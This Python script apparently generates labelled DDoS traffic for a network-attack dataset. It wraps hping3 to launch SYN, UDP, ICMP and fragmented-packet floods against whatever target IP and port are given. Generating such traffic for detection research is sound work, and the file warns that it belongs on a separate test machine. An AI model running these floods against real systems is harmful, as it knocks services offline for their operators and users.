"""
dataset/generators/ddos_gen.py
==============================
Generates volumetric DDoS traffic using hping3.
Sub-scenarios: SYN flood, UDP flood, ICMP flood.

⚠️  Run on a SEPARATE test/attacker machine.
    NEVER run on the production capture machine.

Usage:
  python ddos_gen.py --target 192.168.1.10 --duration 30 --sub syn_flood
"""
import argparse
import subprocess
import sys
import time


SCENARIOS = {
    "syn_flood": {
        "cmd": lambda t, port: ["hping3", "--syn", "--flood", "-p", str(port), t],
        "desc": "TCP SYN flood (maximum rate)",
    },
    "syn_rate": {
        "cmd": lambda t, port: ["hping3", "--syn", "-p", str(port), "-i", "u1000", t],
        "desc": "TCP SYN flood (1000 pps — controlled rate for training data)",
    },
    "udp_flood": {
        "cmd": lambda t, port: ["hping3", "--udp", "--flood", "-p", str(port), t],
        "desc": "UDP flood",
    },
    "icmp_flood": {
        "cmd": lambda t, port: ["hping3", "--icmp", "--flood", t],
        "desc": "ICMP flood",
    },
    "frag_flood": {
        "cmd": lambda t, port: ["hping3", "--udp", "-f", "--flood", "-p", str(port), t],
        "desc": "Fragmented UDP flood",
    },
}


def run(target: str, duration: int, sub: str, port: int = 80):
    if sub not in SCENARIOS:
        print(f"[ERROR] Unknown sub-scenario: {sub}. Choose from: {', '.join(SCENARIOS)}")
        sys.exit(1)

    scenario = SCENARIOS[sub]
    cmd = scenario["cmd"](target, port)

    print(f"[ddos_gen] Scenario : {sub}")
    print(f"[ddos_gen] Desc     : {scenario['desc']}")
    print(f"[ddos_gen] Target   : {target}:{port}")
    print(f"[ddos_gen] Duration : {duration}s")
    print(f"[ddos_gen] Command  : {' '.join(cmd)}")
    print(f"[ddos_gen] Starting...")

    try:
        proc = subprocess.Popen(cmd)
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
    except FileNotFoundError:
        print("[ddos_gen] ERROR: hping3 not found. Install: sudo apt install hping3")
        sys.exit(1)
    except KeyboardInterrupt:
        proc.terminate()

    print(f"[ddos_gen] Done — {sub} ran for {duration}s")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS traffic generator for SIH26145 dataset")
    parser.add_argument("--target",   required=True, help="Target IP address")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("--sub",      default="syn_rate",
                        choices=list(SCENARIOS.keys()), help="Sub-scenario")
    parser.add_argument("--port",     type=int, default=80, help="Destination port")
    args = parser.parse_args()

    run(args.target, args.duration, args.sub, args.port)
